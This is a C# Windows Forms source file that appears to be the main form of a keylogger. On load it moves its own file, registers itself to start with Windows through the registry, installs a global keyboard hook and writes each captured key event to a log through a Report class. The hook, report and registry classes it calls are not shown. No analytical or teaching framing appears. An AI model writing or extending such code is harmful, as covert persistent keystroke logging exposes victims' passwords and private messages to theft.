using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace 记住
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private Hook MyHook = new Hook();
        private Report MyReport = new Report();
        private RegistryReport MyRegistryReport;
        private void Form1_Load(object sender, EventArgs e)
        {
            MyRegistryReport = new RegistryReport();
            this.MyRegistryReport.MoveFile();
            this.MyRegistryReport.registryRun();
            this.MyReport.FirstWrite();
            this.MyHook.SetHook();
            this.MyHook.KeyboardEvent += new KeyboardEventHandler(MyHook_KeyboardEvent);
        }
        private void MyHook_KeyboardEvent(KeyboardEvents keyEvent, Keys key)
        {
            string keyEvents = keyEvent.ToString();
            string keyDate = key.ToString();
            textBox1.Text = keyDate;
            this.MyReport.WriteDate(keyEvents, keyDate);
        }
    }
}
